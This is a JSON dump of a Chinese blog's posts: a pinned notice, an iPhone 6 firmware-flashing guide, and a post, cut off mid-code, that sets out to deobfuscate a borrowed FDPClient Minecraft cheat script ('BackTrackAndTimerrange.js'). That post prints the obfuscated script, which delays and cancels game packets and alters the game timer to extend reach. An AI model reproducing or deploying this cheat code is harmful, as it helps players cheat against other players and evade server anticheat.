[{"content":"本站分离了 是的经过我的深思熟虑，我决定将博客内的一些内容移到副站，因为本站即将申请友链和开往\n软件资源 雷风配置 V2配置文件 饭 联系：huaweilaomke402@gmail.com\n饭 这里是捐赠的名单 无\u0026hellip;\n","date":"2023-09-10T21:36:10+07:00","permalink":"https://blog.xpdbk.com/post/zhiding/","title":"置顶公告"},{"content":"IPhone 刷新固件的方法 因为越狱后我安装了一个插件导致APT包管理崩溃所以出了这一期教程\n第一步-下载i4助手 i4下载 第二步-安装i4助手 一直点击下一步直到桌面或者开始菜单有下面的图标之后打开i4助手\n第三步-连接IPhone6 这一步可能涉及到你的充电器是否支持数据传说和数据接口是否被腐蚀\n连接成功后如下图\n第四步-转到刷机选项卡 第一步点击智能刷机\n第二步点击下载\n第三步点击立即刷机\n总结 除了最新固件你也能使用老固件，但是这需要你提前备份了SHSH2，因为苹果官方不想让你降级系统，降级系统会有被越狱的风险，这样就会触犯苹果官方的应用商店收费利益，所以你需要提前备份shsh2，也就是你最后能越狱的系统版本，因为最后能越狱的系统版本会在你手机刷机之后立刻换成最新版本的系统。\n","date":"2024-02-07T07:51:55+07:00","permalink":"https://blog.xpdbk.com/post/iphone6-firmware/","title":"如何刷新IPhone6的固件"},{"content":" 本篇文章所有东西仅供学习和记录\nFDPClient的一个js的反混淆 本文章的所有JS来自某人，他的JS可以兼容FDPClient所以我拿他的JS来玩玩\n开始实践 这些东西我略懂一点点，如有不妥评论区见\nBackTrackAndTimerrange.js 这个BackTrackAndTimerrange.js从名字我们就能看出来这是一个延迟+变速齿轮增加手长度的js，但是他的源码是被混淆状态的非常的不好Skid，如下\nJS 1 var version_=\u0026#39;xpdbk.com\u0026#39;;var _0x628450=_0x48b1;function _0x487d(){var _0x1d7888=(function(){return[version_,\u0026#39;ONFtjnbusDjiqYaQPOmqiOwV.wucomUU.OtdvLV7==\u0026#39;,\u0026#39;WQHYW67dI8oaWOtdQmk7Fr9o\u0026#39;,\u0026#39;zmktomo9umkPBwGZ\u0026#39;,\u0026#39;A13dImoXDxpdNtRcG1OMbSk/mWbov8oxW5/cV8oUrGeWuJBcTrFcUmkwW6XsFfvdx8knxGRcQMuAgCohW6BcS8kOW4FcJ8kXW6/cMfNcVCoKW6JcOmkLvSkiBa\u0026#39;,\u0026#39;W40bW4KNBYRdOYNdKKhdVNC\u0026#39;,\u0026#39;WQuxWORdNqOfs8kvWQC\u0026#39;,\u0026#39;WODIiHiQk8ob\u0026#39;,\u0026#39;nCoBAcBcMJBcLq8\u0026#39;,\u0026#39;WQOnWQZdNSkge2RcSCoJpxK\u0026#39;,\u0026#39;W6eyWPOBW7xcKmogjG\u0026#39;,\u0026#39;wcyZW5hdI8omWO3cRu8hdSoBW40P\u0026#39;,\u0026#39;W44gW4qNAsVcS13dVxVdIe1vW7q\u0026#39;,\u0026#39;r8odjmoIWODYWPdcRGpdVmkgW5Cleg/cUCkBW5jBW4xcNdlcU8oUwCk1Cf5QqrewWRJdIf/dGmkQWPCNWR1tcX8bvCkKj8k3WPm\u0026#39;,\u0026#39;tXBdVmorW63dMq7cICkluNO\u0026#39;,\u0026#39;W5aDW4pdQwjoes7dTmoVW7a\u0026#39;,\u0026#39;sSohpSkVWO93WRVcVqxdOmkt\u0026#39;,\u0026#39;CGqMaSoWWQfmy8o5uJ0TwG\u0026#39;,\u0026#39;W79KW4dcNCozb8oWpsG\u0026#39;,\u0026#39;pSopDdhcIZpcVrZcUf4v\u0026#39;,\u0026#39;WPpcJgpcG8oeWPnSW5PuWOWE\u0026#39;,\u0026#39;BeVdSCkWBNpdNtG\u0026#39;,\u0026#39;W6PbWOefAmkfW6O\u0026#39;,\u0026#39;W5qzW5NdHgjwhdNdV8oLW6JcLh0\u0026#39;,\u0026#39;kmk0o8oc\u0026#39;,\u0026#39;m0ddImoSWQLDW4JdKbxcNqz0W7y\u0026#39;,\u0026#39;WQWDE0GWW64YWO7dI8kbvWvtqIFcKmkzb8oIWOq5W7DQW4jBW6TGeCo6W4yak8oIWOLafSkWW77cTNpdTcHNW7BdNCo+kH3cNmo5mJu\u0026#39;,\u0026#39;A8kdpSozrCkJA2G\u0026#39;,\u0026#39;e2qrpmoHDLSZEW\u0026#39;,\u0026#39;Bu3dJSkRBhpdNJO\u0026#39;,\u0026#39;naRcImoNlIRcHJNcI34Udmk7\u0026#39;,\u0026#39;WOmxWR1shCokWPC\u0026#39;,\u0026#39;r1NdN8k0tgJdKJZcI3mtkCkMEbX2\u0026#39;,\u0026#39;AgCLlq\u0026#39;,\u0026#39;W6nbWOfLzmkbW6fMEmkFiSoTW7zPEqJdSmkzaqVcOColWPGMW5lcPtmYWPrPWQZdUXusdmkqW4xcKJ/cTSofpCkOkSotWQNdTIpcLCkBkhCPW7VcMW\u0026#39;,\u0026#39;a8oBW5aBb8kqWRi\u0026#39;,\u0026#39;W68cW4vWtq\u0026#39;,\u0026#39;e8kRoCoqWRVdMKhcS3uksSkf\u0026#39;,\u0026#39;kCoxAJC\u0026#39;,\u0026#39;rCo3mmo0wezCtfKc\u0026#39;,\u0026#39;z8ofW6KfdSkwWOWkWQ0DW40NW7qA\u0026#39;,\u0026#39;qu/cNCkHWQPnpColBSkiW7aMWRtdVY8OWPRdOmoDiL5WrteNjXNcP3nnWO4\u0026#39;,\u0026#39;qNGXlmk3WQZcNSk6WOC\u0026#39;].concat((function(){return[\u0026#39;rqtdN8oDW77dNcxcMa\u0026#39;,\u0026#39;BmkEEr/cIW7cIZi\u0026#39;,\u0026#39;WROCWQFdMmkhnKhcHSoViq\u0026#39;,\u0026#39;WOTFWPX1k0/dTGRdLvW\u0026#39;,\u0026#39;W6jkWQa7BCkjW7TM\u0026#39;,\u0026#39;WR0vWRldMa\u0026#39;,\u0026#39;sNmbc8kHWRNcTmk3WOWbW63cTmoF\u0026#39;,\u0026#39;v8oWW4G2nmkPWPKUWOe9W60\u0026#39;,\u0026#39;W5nCW7r0WQNdRNtcQmkOW6z/duGV\u0026#39;,\u0026#39;W58vv8o3W6u3cW\u0026#39;,\u0026#39;WPxdKqPRdG\u0026#39;,\u0026#39;AXpcImo1W7igWPtdPZtcJH9eW7RcRrpdGd3cT8o9y8o9zSkdWO5lzSkTeZtcRSkNWQpdJKBcKrmSWPdcGd/dGNOmW4FdSSoXeCk5dw8ZWROGW7RcQa\u0026#39;,\u0026#39;amo2W4iAbSkUWRi\u0026#39;,\u0026#39;W7LDWOuU\u0026#39;,\u0026#39;WOddNanAe2tcQCoXvSoCW6WHr8ki\u0026#39;,\u0026#39;WQqyW4dcPZucWPO\u0026#39;,\u0026#39;u8orW6jJAhjnW6dcRmoUW54\u0026#39;,\u0026#39;W7HDW7lcJmowtrVcGCoKo1RdU1e\u0026#39;,\u0026#39;z09Rk0WmAfD7WP/cQCkHmSoWWQmxW7/cM8oUW7u4cCofj0ZcT8kJkmk4iZ3dLSkSpSo+BbVdKCofg8oSBLzMW7RdKLNcQ3ZcMYFdGqhdTa\u0026#39;,\u0026#39;W51UW4nSWRTQ\u0026#39;,\u0026#39;lvbIhCkOW7Owqmo4saSADITRomkuvw/dGWhcISoQW6KdWQeMuCopk8kXkmo3lWRcKdy\u0026#39;,\u0026#39;WPPEAmkhiCkNWQKlW67dGIK\u0026#39;,\u0026#39;W6PbWOepBmkBW6XXCSkDn8oIW60P\u0026#39;,\u0026#39;BCktomkdxmkJAgGKprVdGComW6GWxLZdP8kvDGakc0RcN8kyhvvvAh9raWiCurq+kYtdRmk2s8k+DIBdM8k0lhfFWPRdVSotbSktoa\u0026#39;,\u0026#39;gKhcPSkfWR7cH3NcRCkSxxyusa\u0026#39;,\u0026#39;rcyGWPBdLCorWOBcUMeAc8oiW5vIWRVdVSkGW6GCg8oDWPZcJmkzDx5eWPTpA3FcNCkfWPaZhsbRWO0HWQTzW7RcRSkIW7FdJmoQltrNlSkjW7/cRW\u0026#39;,\u0026#39;FYddPCosWR9aBJDP\u0026#39;,\u0026#39;W68dW41fu8kgiCokW5C\u0026#39;,\u0026#39;WOacWRBdNmkvgG\u0026#39;,\u0026#39;WOfeWPVcVtCwmr/dG8ofW4RcSG\u0026#39;,\u0026#39;W5W6WRS1o8oOWPHkWR7cQCkXDCklWPldIvmTWQhdSIBdJSk1lLq7W5lcRCodW690WQFdSWdcHCkJa8o1m8o4scG0WR9zWPddUdLXw8kGWORcSq\u0026#39;,\u0026#39;Cr/cKCk+W60\u0026#39;,\u0026#39;W64esSo+W7G\u0026#39;,\u0026#39;WOenWQ8GW7ZcTqtdRmkaW4TQ\u0026#39;,\u0026#39;rCkLd14\u0026#39;,\u0026#39;AcNdRSoHWRznuIr+W5ub\u0026#39;,\u0026#39;WO1gDSkb\u0026#39;,\u0026#39;FZhdSmoN\u0026#39;,\u0026#39;D8kCgYFdRgtdUSkIoSkgWPqwb3miW6a\u0026#39;,\u0026#39;WR9QW7ddJq\u0026#39;,\u0026#39;rwmhmCkWWQtcKCkZ\u0026#39;,\u0026#39;W70tWR4PW6lcMSoxnW\u0026#39;,\u0026#39;W7OmaCkumCkHW7S\u0026#39;].concat((function(){return[\u0026#39;W791W5xcQa\u0026#39;,\u0026#39;W70LWRlcMSksW5ZcLCkKwYntoCkI\u0026#39;,\u0026#39;W7uoW5W7uSkonSokW4yOsLz1WQhdL25nWOSsW5zVg2ZcLfBdT8oPW4NdSw9qCCoDW74rWRNcGbrMWR1KjCkFWO/cUuX2gN7cHSkFW4S\u0026#39;,\u0026#39;WRZcH8kvlqORW4RdPG4\u0026#39;,\u0026#39;k25hW7PHsCkbW6VcSwa\u0026#39;,\u0026#39;cCohDZFcNa\u0026#39;,\u0026#39;W4HKW5PGWQzxpelcLZC\u0026#39;,\u0026#39;W5nEW7v7WQ/dQxtdVmkoW7n3k18\u0026#39;,\u0026#39;pvz5CW\u0026#39;,\u0026#39;pmkov8ovDCkaaW\u0026#39;,\u0026#39;zLNdKSk8FxBdTINcHuyZ\u0026#39;,\u0026#39;wmksdcxdL3JdGG\u0026#39;,\u0026#39;W6qtemkyoSkgW4/dMKWf\u0026#39;,\u0026#39;W77dVXxcPW\u0026#39;,\u0026#39;WPftWOu+nhxdQaRdK0RdIgfgWRS7lmkjEq1LWO/dNqaUWQmivMNdK8kxWQDZW4hdVwxcStaeW7BdUKtdOmowjI3cGrFcS8k7Cd/dMIW\u0026#39;,\u0026#39;qSoHc8k0CL1DxfqudmkAW7KLW5L2W5TsWOhdTd0+a33cHILBtc/cIxJcLmoGWQ/cVSo2WQlcN0ncAgDlW5hcINZdPSk8WPGFW6rD\u0026#39;,\u0026#39;rcyGWPBdLCorWOBcUMeAc8oiW5vIWRVdVSkGW6GCg8oDWPZcJmkzDx5eWOTgCgtcLSkdWPaJhvvRWO0HWQTzW7RcUCkPW7ddLCo/iXS\u0026#39;,\u0026#39;WO8dWRuQW7BcTXK\u0026#39;,\u0026#39;ySkskmo5xSkzy2mJhG/dGSonWQm\u0026#39;,\u0026#39;WQv2W7tcHSoiWOhdG8kOEWnBo8kaW4zrfmkrWRFdIc14wSk7DCoblfO9WRzBW5b0smkCW4NdPCkNwuidWQBcSXpdMmofDNS+k8okWO7dQG\u0026#39;,\u0026#39;W4azW5NdMxndid0\u0026#39;,\u0026#39;W7KKWRJcN8ktW57dImklEGHTlq\u0026#39;,\u0026#39;uSkydaldNwldK8kGp8k5WQW6ga\u0026#39;,\u0026#39;FunYyfm2DLD9WOK\u0026#39;,\u0026#39;vXFcKSk/W7acWQxdJdBcKrS\u0026#39;,\u0026#39;WRCLyrBdK8ouumknzCkLbG\u0026#39;,\u0026#39;bmongWhdNuFdQmkz\u0026#39;,\u0026#39;WQugWP/dQa\u0026#39;,\u0026#39;WR06WPFdV8kcuSkXmrK6W6WMza\u0026#39;,\u0026#39;W4vgjJKBf8oCWRZcMsvPWO9QW5WgWQm\u0026#39;,\u0026#39;Cr/cKCk+W608WORdPZlcMa\u0026#39;,\u0026#39;WPDACSokkCkIWOiyW6JdNJZdQgJdNCkxWQFdJCoWw0/dNCk+eSkYWQyPAvFcUmk2uxlcQXuuW5pdK8otfLPnyCoAWO/cI8k4cSoUhW\u0026#39;,\u0026#39;smocnmkyWOviWPVcPqtdN8ksW5qkwW\u0026#39;,\u0026#39;tsyGW7VdMComWO3cUg0AeW\u0026#39;,\u0026#39;xISXW6JdLmozWPhcUNa\u0026#39;,\u0026#39;rSo2E8kQW6tcILhcMei\u0026#39;,\u0026#39;wmoTeSo/BwDdxfic\u0026#39;,\u0026#39;vSkCfI/dNxRdNSk3nmkZWRq\u0026#39;,\u0026#39;WRZcLSkaga\u0026#39;,\u0026#39;zmktomo5umkT\u0026#39;,\u0026#39;kmkKjSocAG\u0026#39;];}()));}()));}());_0x487d=function(){return _0x1d7888;};return _0x487d();}function _0x48b1(_0x43afb9,_0x1430fa){var _0x487d85=_0x487d();return _0x48b1=function(_0x48b135,_0x512237){_0x48b135=_0x48b135-0xaf;var _0x2d287d=_0x487d85[_0x48b135];if(_0x48b1[\u0026#39;gwNkqJ\u0026#39;]===undefined){var _0x2d3d46=function(_0x555a37){var _0x3acec2=\u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=\u0026#39;;var _0x3f50ce=\u0026#39;\u0026#39;,_0x40a203=\u0026#39;\u0026#39;;for(var _0x570d3a=0x0,_0x560a6e,_0xf7fc34,_0x2e7362=0x0;_0xf7fc34=_0x555a37[\u0026#39;charAt\u0026#39;](_0x2e7362++);~_0xf7fc34\u0026amp;\u0026amp;(_0x560a6e=_0x570d3a%0x4?_0x560a6e*0x40+_0xf7fc34:_0xf7fc34,_0x570d3a++%0x4)?_0x3f50ce+=String[\u0026#39;fromCharCode\u0026#39;](0xff\u0026amp;_0x560a6e\u0026gt;\u0026gt;(-0x2*_0x570d3a\u0026amp;0x6)):0x0){_0xf7fc34=_0x3acec2[\u0026#39;indexOf\u0026#39;](_0xf7fc34);}for(var _0x420760=0x0,_0x6c8396=_0x3f50ce[\u0026#39;length\u0026#39;];_0x420760\u0026lt;_0x6c8396;_0x420760++){_0x40a203+=\u0026#39;%\u0026#39;+(\u0026#39;00\u0026#39;+_0x3f50ce[\u0026#39;charCodeAt\u0026#39;](_0x420760)[\u0026#39;toString\u0026#39;](0x10))[\u0026#39;slice\u0026#39;](-0x2);}return decodeURIComponent(_0x40a203);};var _0x178a33=function(_0x3ff227,_0x4e7c5c){var _0x15f83d=[],_0x475f6e=0x0,_0x6aa57d,_0x472e1f=\u0026#39;\u0026#39;;_0x3ff227=_0x2d3d46(_0x3ff227);var _0xb3480f;for(_0xb3480f=0x0;_0xb3480f\u0026lt;0x100;_0xb3480f++){_0x15f83d[_0xb3480f]=_0xb3480f;}for(_0xb3480f=0x0;_0xb3480f\u0026lt;0x100;_0xb3480f++){_0x475f6e=(_0x475f6e+_0x15f83d[_0xb3480f]+_0x4e7c5c[\u0026#39;charCodeAt\u0026#39;](_0xb3480f%_0x4e7c5c[\u0026#39;length\u0026#39;]))%0x100,_0x6aa57d=_0x15f83d[_0xb3480f],_0x15f83d[_0xb3480f]=_0x15f83d[_0x475f6e],_0x15f83d[_0x475f6e]=_0x6aa57d;}_0xb3480f=0x0,_0x475f6e=0x0;for(var _0x406744=0x0;_0x406744\u0026lt;_0x3ff227[\u0026#39;length\u0026#39;];_0x406744++){_0xb3480f=(_0xb3480f+0x1)%0x100,_0x475f6e=(_0x475f6e+_0x15f83d[_0xb3480f])%0x100,_0x6aa57d=_0x15f83d[_0xb3480f],_0x15f83d[_0xb3480f]=_0x15f83d[_0x475f6e],_0x15f83d[_0x475f6e]=_0x6aa57d,_0x472e1f+=String[\u0026#39;fromCharCode\u0026#39;](_0x3ff227[\u0026#39;charCodeAt\u0026#39;](_0x406744)^_0x15f83d[(_0x15f83d[_0xb3480f]+_0x15f83d[_0x475f6e])%0x100]);}return _0x472e1f;};_0x48b1[\u0026#39;GzXVFI\u0026#39;]=_0x178a33,_0x43afb9=arguments,_0x48b1[\u0026#39;gwNkqJ\u0026#39;]=!![];}var _0x2126c8=_0x487d85[0x0],_0x22a474=_0x48b135+_0x2126c8,_0x2edf58=_0x43afb9[_0x22a474];return!_0x2edf58?(_0x48b1[\u0026#39;Upqbdl\u0026#39;]===undefined\u0026amp;\u0026amp;(_0x48b1[\u0026#39;Upqbdl\u0026#39;]=!![]),_0x2d287d=_0x48b1[\u0026#39;GzXVFI\u0026#39;](_0x2d287d,_0x512237),_0x43afb9[_0x22a474]=_0x2d287d):_0x2d287d=_0x2edf58,_0x2d287d;},_0x48b1(_0x43afb9,_0x1430fa);};(function(_0x257205,_0x564dd0,_0x1cb0b9,_0x1ee07d,_0x8feb60,_0xaac9ee,_0x484dd5){return _0x257205=_0x257205\u0026gt;\u0026gt;0x3,_0xaac9ee=\u0026#39;hs\u0026#39;,_0x484dd5=\u0026#39;hs\u0026#39;,function(_0x2d32d3,_0x13d3a1,_0x53f34e,_0x26baeb,_0x4f73af){var _0x6cf5bf=_0x48b1;_0x26baeb=\u0026#39;tfi\u0026#39;,_0xaac9ee=_0x26baeb+_0xaac9ee,_0x4f73af=\u0026#39;up\u0026#39;,_0x484dd5+=_0x4f73af,_0xaac9ee=_0x53f34e(_0xaac9ee),_0x484dd5=_0x53f34e(_0x484dd5),_0x53f34e=0x0;var _0x107aa6=_0x2d32d3();while(!![]\u0026amp;\u0026amp;--_0x1ee07d+_0x13d3a1){try{_0x26baeb=parseInt(_0x6cf5bf(0x100,\u0026#39;hrq$\u0026#39;))/0x1*(parseInt(_0x6cf5bf(0xdd,\u0026#39;czpK\u0026#39;))/0x2)+-parseInt(_0x6cf5bf(0x123,\u0026#39;DToo\u0026#39;))/0x3+parseInt(_0x6cf5bf(0xdb,\u0026#39;bNLl\u0026#39;))/0x4*(-parseInt(_0x6cf5bf(0xbf,\u0026#39;JZ$5\u0026#39;))/0x5)+parseInt(_0x6cf5bf(0xe4,\u0026#39;)6Dt\u0026#39;))/0x6*(parseInt(_0x6cf5bf(0x125,\u0026#39;REq5\u0026#39;))/0x7)+-parseInt(_0x6cf5bf(0xe9,\u0026#39;EE1%\u0026#39;))/0x8+-parseInt(_0x6cf5bf(0x12a,\u0026#39;DToo\u0026#39;))/0x9+-parseInt(_0x6cf5bf(0x111,\u0026#39;0A\u0026amp;]\u0026#39;))/0xa*(-parseInt(_0x6cf5bf(0x113,\u0026#39;k[9\u0026amp;\u0026#39;))/0xb);}catch(_0x236dc9){_0x26baeb=_0x53f34e;}finally{_0x4f73af=_0x107aa6[_0xaac9ee]();if(_0x257205\u0026lt;=_0x1ee07d)_0x53f34e?_0x8feb60?_0x26baeb=_0x4f73af:_0x8feb60=_0x4f73af:_0x53f34e=_0x4f73af;else{if(_0x53f34e==_0x8feb60[\u0026#39;replace\u0026#39;](/[qUQVOYNLFwuDdPbnt=]/g,\u0026#39;\u0026#39;)){if(_0x26baeb===_0x13d3a1){_0x107aa6[\u0026#39;un\u0026#39;+_0xaac9ee](_0x4f73af);break;}_0x107aa6[_0x484dd5](_0x4f73af);}}}}}(_0x1cb0b9,_0x564dd0,function(_0x40fb87,_0x255bb8,_0x59c5ad,_0x300601,_0xc267cd,_0x57012a,_0x2a4470){return _0x255bb8=\u0026#39;\\x73\\x70\\x6c\\x69\\x74\u0026#39;,_0x40fb87=arguments[0x0],_0x40fb87=_0x40fb87[_0x255bb8](\u0026#39;\u0026#39;),_0x59c5ad=\u0026#39;\\x72\\x65\\x76\\x65\\x72\\x73\\x65\u0026#39;,_0x40fb87=_0x40fb87[_0x59c5ad](\u0026#39;\\x76\u0026#39;),_0x300601=\u0026#39;\\x6a\\x6f\\x69\\x6e\u0026#39;,(0x140817,_0x40fb87[_0x300601](\u0026#39;\u0026#39;));});}(0x638,0xaccae,_0x487d,0xc9),_0x487d)\u0026amp;\u0026amp;(version_=_0x487d);var scriptName=_0x628450(0xc1,\u0026#39;JZ$5\u0026#39;),scriptVersion=0x1,scriptAuthor=_0x628450(0x10f,\u0026#39;IpJr\u0026#39;),timerModule=moduleManager[_0x628450(0x11a,\u0026#39;^H18\u0026#39;)](_0x628450(0xfc,\u0026#39;v%Tk\u0026#39;)),FakeLag=new FakeLag(),Client,ticks=0x0,Lastticks=0x0,Newticks=0x0,a=0x0,b=0x1,c=0x0,d=0x0,DiscoverRange=0x1b;function FakeLag(){var _0x595d96=_0x628450;this[_0x595d96(0x118,\u0026#39;zj6p\u0026#39;)]=function(){var _0x1d0809=_0x595d96;return _0x1d0809(0xd5,\u0026#39;RQTi\u0026#39;);},this[_0x595d96(0xb7,\u0026#39;CG%\u0026amp;\u0026#39;)]=function(){var _0x542ba7=_0x595d96;return _0x542ba7(0xf2,\u0026#39;0A\u0026amp;]\u0026#39;);},this[_0x595d96(0x11e,\u0026#39;]K^Q\u0026#39;)]=function(){var _0x30f48b=_0x595d96;return _0x30f48b(0xe8,\u0026#39;czpK\u0026#39;);},this[_0x595d96(0xe2,\u0026#39;CG%\u0026amp;\u0026#39;)]=function(){var _0x1e18e0=_0x595d96;return _0x1e18e0(0xca,\u0026#39;WKaR\u0026#39;);},this[_0x595d96(0xd0,\u0026#39;CG%\u0026amp;\u0026#39;)]=function(){var _0x10e733=_0x595d96;DiscoverRange\u0026lt;=0x17\u0026amp;\u0026amp;(a=0x1);;b\u0026gt;0x5\u0026amp;\u0026amp;DiscoverRange--;;mc[_0x10e733(0xe6,\u0026#39;rOZH\u0026#39;)][_0x10e733(0x126,\u0026#39;v%Tk\u0026#39;)]==0xa\u0026amp;\u0026amp;b==0x0\u0026amp;\u0026amp;(DiscoverRange-=0x1);;a==0x1?(mc[_0x10e733(0xbd,\u0026#39;4HBB\u0026#39;)][_0x10e733(0xce,\u0026#39;czpK\u0026#39;)]=0x0,mc[_0x10e733(0x11f,\u0026#39;kuOy\u0026#39;)][_0x10e733(0xfd,\u0026#39;dbY6\u0026#39;)]=0.8,a=0x2):mc[_0x10e733(0x119,\u0026#39;zj6p\u0026#39;)][_0x10e733(0x103,\u0026#39;DI7W\u0026#39;)]=0.02;;if(a\u0026gt;=0x2\u0026amp;\u0026amp;a\u0026lt;=0x4){d=0x1;a\u0026gt;=0x2\u0026amp;\u0026amp;a\u0026lt;=0x3\u0026amp;\u0026amp;(mc[_0x10e733(0xec,\u0026#39;RQTi\u0026#39;)][_0x10e733(0x10e,\u0026#39;Bghg\u0026#39;)]=0xa);;a++,DiscoverRange=0x2f;}else d=0x0;;if(a\u0026gt;0x3\u0026amp;\u0026amp;a\u0026lt;=0x5){a==0x4\u0026amp;\u0026amp;(mc[_0x10e733(0xeb,\u0026#39;IpJr\u0026#39;)][_0x10e733(0x115,\u0026#39;IpJr\u0026#39;)]=0.5);;a++;};c==0x2\u0026amp;\u0026amp;DiscoverRange--;;a\u0026gt;0x4\u0026amp;\u0026amp;(mc[_0x10e733(0xd6,\u0026#39;EIu\u0026amp;\u0026#39;)][_0x10e733(0x11b,\u0026#39;qDiY\u0026#39;)]=0x1,a=0x0);;if(mc[_0x10e733(0xbd,\u0026#39;4HBB\u0026#39;)][_0x10e733(0xbe,\u0026#39;JZ$5\u0026#39;)]\u0026gt;=0x0\u0026amp;\u0026amp;mc[_0x10e733(0xfa,\u0026#39;HudS\u0026#39;)][_0x10e733(0xbc,\u0026#39;]K^Q\u0026#39;)]\u0026lt;0xa)c=0x1;else mc[_0x10e733(0xb3,\u0026#39;k[9\u0026amp;\u0026#39;)][_0x10e733(0xf4,\u0026#39;caNx\u0026#39;)]==0xa\u0026amp;\u0026amp;(c=0x2);;},this[_0x595d96(0xf5,\u0026#39;kgN%\u0026#39;)]=function(_0x178a33){var _0x44b3c9=_0x595d96,_0x555a37=_0x178a33[_0x44b3c9(0x121,\u0026#39;]K^Q\u0026#39;)](),_0x3acec2=Java[_0x44b3c9(0xd9,\u0026#39;CG%\u0026amp;\u0026#39;)](_0x44b3c9(0xbb,\u0026#39;OoZU\u0026#39;)),_0x3f50ce=Java[_0x44b3c9(0xee,\u0026#39;jTFu\u0026#39;)](_0x44b3c9(0x122,\u0026#39;JZ$5\u0026#39;)),_0x40a203=Java[_0x44b3c9(0xd1,\u0026#39;czpK\u0026#39;)](_0x44b3c9(0x106,\u0026#39;qDiY\u0026#39;)),_0x570d3a=Java[_0x44b3c9(0x11d,\u0026#39;HudS\u0026#39;)](_0x44b3c9(0x105,\u0026#39;DToo\u0026#39;)),_0x560a6e=Java[_0x44b3c9(0xf7,\u0026#39;k[9\u0026amp;\u0026#39;)](_0x44b3c9(0xd7,\u0026#39;IpJr\u0026#39;)),_0xf7fc34=Java[_0x44b3c9(0xc2,\u0026#39;0%wd\u0026#39;)](_0x44b3c9(0xc3,\u0026#39;CG%\u0026amp;\u0026#39;)),_0x2e7362=Java[_0x44b3c9(0xf7,\u0026#39;k[9\u0026amp;\u0026#39;)](_0x44b3c9(0x10a,\u0026#39;]6kW\u0026#39;)),_0x420760=Java[_0x44b3c9(0xc7,\u0026#39;v%Tk\u0026#39;)](_0x44b3c9(0xf9,\u0026#39;b(T5\u0026#39;)),_0x6c8396=Java[_0x44b3c9(0xff,\u0026#39;@jy2\u0026#39;)](_0x44b3c9(0xea,\u0026#39;utdA\u0026#39;)),_0x3ff227=Java[_0x44b3c9(0xf3,\u0026#39;]6kW\u0026#39;)](_0x44b3c9(0x107,\u0026#39;zj6p\u0026#39;)),_0x4e7c5c=Java[_0x44b3c9(0xf0,\u0026#39;Cz\u0026amp;\u0026amp;\u0026#39;)](_0x44b3c9(0xde,\u0026#39;Bghg\u0026#39;)),_0x15f83d=Java[_0x44b3c9(0x104,\u0026#39;K*b]\u0026#39;)](_0x44b3c9(0x12b,\u0026#39;4$sA\u0026#39;)),_0x475f6e=Java[_0x44b3c9(0xf1,\u0026#39;rOZH\u0026#39;)](_0x44b3c9(0xe5,\u0026#39;zj6p\u0026#39;)),_0x6aa57d=Java[_0x44b3c9(0x112,\u0026#39;Yi2B\u0026#39;)](_0x44b3c9(0xe3,\u0026#39;]K^Q\u0026#39;)),_0x472e1f=Java[_0x44b3c9(0xff,\u0026#39;@jy2\u0026#39;)](_0x44b3c9(0x116,\u0026#39;Cz\u0026amp;\u0026amp;\u0026#39;)),_0xb3480f=Java[_0x44b3c9(0xb9,\u0026#39;kuOy\u0026#39;)](_0x44b3c9(0xe0,\u0026#39;Bd5x\u0026#39;));if(_0x555a37 instanceof _0x40a203)DiscoverRange--,Newticks++,Newticks++,b++,Newticks++,Newticks++;else b\u0026gt;=0x0\u0026amp;\u0026amp;b--;;Newticks\u0026gt;=0x32\u0026amp;\u0026amp;(Newticks=-0x7,ticks=0x0);;if(d=0x1){_0x555a37 instanceof _0x570d3a\u0026amp;\u0026amp;_0x178a33[_0x44b3c9(0xe1,\u0026#39;Cz\u0026amp;\u0026amp;\u0026#39;)](_0x570d3a);;_0x555a37 instanceof _0x3acec2\u0026amp;\u0026amp;_0x178a33[_0x44b3c9(0xaf,\u0026#39;)6Dt\u0026#39;)](_0x3acec2);;_0x555a37 instanceof _0x15f83d\u0026amp;\u0026amp;_0x178a33[_0x44b3c9(0x101,\u0026#39;JZ$5\u0026#39;)](_0x15f83d);;_0x555a37 instanceof _0x3f50ce\u0026amp;\u0026amp;cancelEvent(_0x3f50ce);;};if(Newticks\u0026gt;0x0){Newticks--;_0x555a37 instanceof _0x3f50ce\u0026amp;\u0026amp;cancelEvent(_0x3f50ce);;_0x555a37 instanceof _0x2e7362\u0026amp;\u0026amp;_0x178a33[_0x44b3c9(0x11c,\u0026#39;0A\u0026amp;]\u0026#39;)](_0x2e7362);;_0x555a37 instanceof _0x570d3a\u0026amp;\u0026amp;_0x178a33[_0x44b3c9(0xb4,\u0026#39;v%Tk\u0026#39;)](_0x570d3a);;_0x555a37 instanceof _0x420760\u0026amp;\u0026amp;_0x178a33[_0x44b3c9(0xb5,\u0026#39;hVK2\u0026#39;)](_0x420760);;_0x555a37 instanceof _0x6aa57d\u0026amp;\u0026amp;_0x178a33[_0x44b3c9(0xdc,\u0026#39;GNoZ\u0026#39;)](_0x6aa57d);;};_0x555a37 instanceof _0x40a203\u0026amp;\u0026amp;ticks==0x0\u0026amp;\u0026amp;Newticks\u0026gt;=0x0\u0026amp;\u0026amp;(ticks=0x28);;if(ticks\u0026gt;=0x14){ticks--;_0x555a37 instanceof _0x15f83d\u0026amp;\u0026amp;Lastticks++;;_0x555a37 instanceof _0x40a203\u0026amp;\u0026amp;_0x555a37 instanceof _0x15f83d\u0026amp;\u0026amp;_0x178a33[_0x44b3c9(0xb1,\u0026#39;4$sA\u0026#39;)](_0x15f83d(_0x555a37[_0x44b3c9(0xcc,\u0026#39;)6Dt\u0026#39;)]()));;_0x555a37 instanceof _0x3acec2\u0026amp;\u0026amp;_0x178a33[_0x44b3c9(0xd3,\u0026#39;*x8w\u0026#39;)](_0x3acec2);;_0x555a37 instanceof _0xf7fc34\u0026amp;\u0026amp;_0x178a33[_0x44b3c9(0xed,\u0026#39;AJDT\u0026#39;)](_0xf7fc34);;_0x555a37 instanceof _0x570d3a\u0026amp;\u0026amp;_0x178a33[_0x44b3c9(0xb0,\u0026#39;EE1%\u0026#39;)](_0x570d3a);;};if(ticks\u0026lt;0x15){ticks--;if(Lastticks\u0026gt;0x0){Lastticks--;if(_0x555a37 instanceof _0x15f83d){}else{if(c==0x0){_0x555a37 instanceof _0x570d3a\u0026amp;\u0026amp;_0x178a33[_0x44b3c9(0x127,\u0026#39;czpK\u0026#39;)](_0x570d3a);;_0x555a37 instanceof _0x420760\u0026amp;\u0026amp;_0x178a33[_0x44b3c9(0x110,\u0026#39;4)r0\u0026#39;)](_0x420760);;_0x555a37 instanceof 